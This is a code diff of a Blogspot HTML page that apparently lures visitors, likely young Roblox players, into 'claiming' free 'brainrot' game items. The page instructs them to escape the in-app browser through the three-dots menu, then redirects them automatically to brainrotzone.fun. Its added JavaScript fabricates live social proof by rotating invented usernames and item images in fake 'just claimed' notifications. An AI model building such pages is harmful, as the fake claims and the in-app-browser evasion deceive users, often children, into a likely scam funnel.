@@ -13,16 +13,85 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background: linear-gradient(rgba(240, 240, 240, 0.9), rgba(224, 224, 224, 0.9)), 
-                        url('https://i.postimg.cc/50Kr99Ng/Screenshot-20251011-195003-Chrome.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
+            background: #2D5A5A;
             font-family: Arial, sans-serif;
+            position: relative;
         }
 
-        #tiktok-logo {
-            width: 250px;
+        .popup-container {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            max-width: 350px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .popup-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .back-arrow, .close-btn {
+            font-size: 24px;
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .three-dots {
+            font-size: 20px;
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .content-area {
+            background: white;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .red-arrow {
+            font-size: 60px;
+            color: red;
+            position: absolute;
+            top: -30px;
+            right: 20px;
+            transform: rotate(45deg);
+            z-index: 10;
+        }
+
+        .instruction-text {
+            font-size: 16px;
+            font-weight: bold;
+            color: black;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .notification-bar {
+            background: #333;
+            border: 3px solid #00ff00;
+            border-radius: 15px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+            font-size: 14px;
+            max-width: 350px;
+            width: 90%;
             margin-bottom: 20px;
             margin-top: 40px; /* Move the GIF down */
         }
@@ -33,30 +102,79 @@
             opacity: 0;
             animation: fadeIn 2s ease-in-out forwards, scaleUp 2s ease-in-out infinite alternate;
         }
-
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-            }
-
-            100% {
-                opacity: 1;
-            }
+        
+        @keyframes fadeInOut {
+            0% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+        
+        .claiming-live-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        
+        .claiming-live-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .claiming-live-content {
+            flex: 1;
+        }
+        
+        .claiming-live-user {
+            font-weight: bold;
+            color: #43d13b;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        .claiming-live-item {
+            color: white;
+            font-size: 14px;
+        }
+        
+        .live-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #ff0000;
+            border-radius: 50%;
+            margin-right: 5px;
+            animation: pulse 1.5s infinite;
         }
 
-        @keyframes scaleUp {
-            0% {
-                transform: scale(1);
-            }
-
-            100% {
-                transform: scale(1.2);
-            }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
         }
 
-        #openLink {
-            margin: 50px;
-            text-align: center;
+        /* Mobile Optimizations */
+        @media (max-width: 640px) {
+            .claiming-live-container {
+                max-width: 250px;
+                right: 10px;
+                bottom: 10px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .claiming-live-container {
+                max-width: 200px;
+            }
+            
+            .claiming-live {
+                padding: 10px;
+            }
+            
+            .claiming-live-icon {
+                width: 30px;
+                height: 30px;
+            }
         }
     </style>
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
@@ -111,13 +229,60 @@ window.history.replaceState({}, document.title, clean_uri);
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 <body>
-    <img id="tiktok-logo" src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="TikTok Logo">
-    <p id="redirect-text"><p><strong>👆 Please follow the instructions above
-To go to the website 👆 ...</strong></p>
-<p><strong></strong></p>
-    <a href="#" id="openLink">    </a>
+    <div class="popup-container">
+        <div class="popup-header">
+            <span class="back-arrow">‹</span>
+            <span class="close-btn">×</span>
+            <span class="three-dots">⋯</span>
+        </div>
+        
+        <div class="content-area">
+            <div class="red-arrow">→</div>
+        </div>
+        
+        <div class="instruction-text">
+            Please Click On The Three Dots At The Top And Open in Browser To to Claim your Brainrot.
+        </div>
+    </div>
+    
+    <div class="notification-bar">
+        <div class="crown-icons">
+            <span class="crown">👑</span>
+            <span class="crown">👑</span>
+            <span class="crown">👑</span>
+        </div>
+        <span>MysticMiner just claimed! 🎉</span>
+    </div>
+    
+    <!-- Claiming Live Feature -->
+    <div class="claiming-live-container" id="claiming-live-container">
+        <!-- Claiming live notifications will be added here by JavaScript -->
+    </div>
 
     <script>
+        // Claiming Live Feature Data
+        const claimingLiveUsers = [
+            'PixelPioneer','BlockBash99','NeonNinja07','RoboRangerX','CraftyCrafter','VoxelVoyager',
+            'AstroArchitect','TurboTumbler23','CosmicCreator','ShadowShifter','MysticMiner','DragonDuelist',
+            'QuantumQuester','BlazeBreaker','AquaAvenger','FrostForge','ThunderTrek','NinjaNova',
+            'CyberBuilder','PixelPunk','RoboRaid','PhantomPhaser','VortexVoyager','SolarSmith',
+            'HyperHacker','TurboTrader','SkywardScribe','EpicBlockMaster','GalaxyGuardian','MegaMineMover'
+        ];
+
+        // Brainrot items for claiming live notifications
+        const brainrotItems = [
+            { name: "Strawberry Elephant", image: "https://i.postimg.cc/T31BR3xK/Early-Strawberrry-Elephant-removebg-preview.png" },
+            { name: "La Secret Combinasion", image: "https://static.wikia.nocookie.net/stealabr/images/f/f2/Lasecretcombinasion.png" },
+            { name: "Burguro and Fryuro", image: "https://i.postimg.cc/HsPNGF9B/burguro-and-fryuro-removebg-preview.png" },
+            { name: "Los 67", image: "https://i.postimg.cc/yNsw1c2Y/Untitled-design-removebg-preview.png" },
+            { name: "Chillin Chili", image: "https://i.postimg.cc/RFtK2MVF/Untitled-design-removebg-preview.png" },
+            { name: "Tang Tang Keletang", image: "https://i.postimg.cc/Y9HkPtCn/Tang-Tnag-Keletang.png" },
+            { name: "Money Money Puggy", image: "https://i.postimg.cc/m2k1J7LN/Money-Money-Puggy-Leak.png" },
+            { name: "Noo My Examen", image: "https://i.postimg.cc/fLs0rFyh/Noo-My-Exam.png" },
+            { name: "dragon cannelloni", image: "https://static.wikia.nocookie.net/stealabr/images/3/31/Nah_uh.png" },
+            { name: "Ketchuru And Musturu", image: "https://static.wikia.nocookie.net/stealabr/images/1/14/Ketchuru.png" }
+        ];
+
         function openLinkBasedOnDevice(url) {
             var userAgent = navigator.userAgent;
 
@@ -132,6 +297,78 @@ To go to the website 👆 ...</strong></p>
                 window.location.href = url;
             }
         }
+
+        // Claiming Live Feature Functions
+        function startClaimingLive() {
+            // Show initial claiming live notifications
+            showClaimingLiveNotification();
+            
+            // Set interval to show new notifications
+            setInterval(showClaimingLiveNotification, 5000);
+        }
+        
+        function showClaimingLiveNotification() {
+            const user = claimingLiveUsers[Math.floor(Math.random() * claimingLiveUsers.length)];
+            const brainrot = brainrotItems[Math.floor(Math.random() * brainrotItems.length)];
+            
+            const notification = document.createElement('div');
+            notification.className = 'claiming-live';
+            notification.innerHTML = `
+                <div class="claiming-live-icon">
+                    <img src="${brainrot.image}" alt="${brainrot.name}">
+                </div>
+                <div class="claiming-live-content">
+                    <div class="claiming-live-user">
+                        <span class="live-indicator"></span>${user}
+                    </div>
+                    <div class="claiming-live-item">just claimed ${brainrot.name}!</div>
+                </div>
+            `;
+            
+            // Add the new notification
+            document.getElementById('claiming-live-container').appendChild(notification);
+            
+            // Remove the notification after 4 seconds
+            setTimeout(() => {
+                if (notification.parentNode) {
+                    notification.style.opacity = '0';
+                    notification.style.transform = 'translateX(100%)';
+                    setTimeout(() => {
+                        if (notification.parentNode) {
+                            notification.parentNode.removeChild(notification);
+                        }
+                    }, 500);
+                }
+            }, 4000);
+            
+            // Limit the number of notifications to 3
+            const notifications = document.getElementById('claiming-live-container').querySelectorAll('.claiming-live');
+            if (notifications.length > 3) {
+                notifications[0].remove();
+            }
+        }
+
+        // Initialize claiming live feature
+        document.addEventListener('DOMContentLoaded', function() {
+            startClaimingLive();
+            
+            // Three dots click handler
+            document.querySelector('.three-dots').addEventListener('click', function() {
+                setTimeout(() => {
+                    openLinkBasedOnDevice('https://brainrotzone.fun/claim-brainrot/');
+                }, 1000);
+            });
+            
+            // Close button handler
+            document.querySelector('.close-btn').addEventListener('click', function() {
+                // Close popup functionality
+            });
+            
+            // Back arrow handler
+            document.querySelector('.back-arrow').addEventListener('click', function() {
+                // Back functionality
+            });
+        });
 
         // Automatically execute the function after a 0.001-second delay (instant redirect)
         setTimeout(function () {
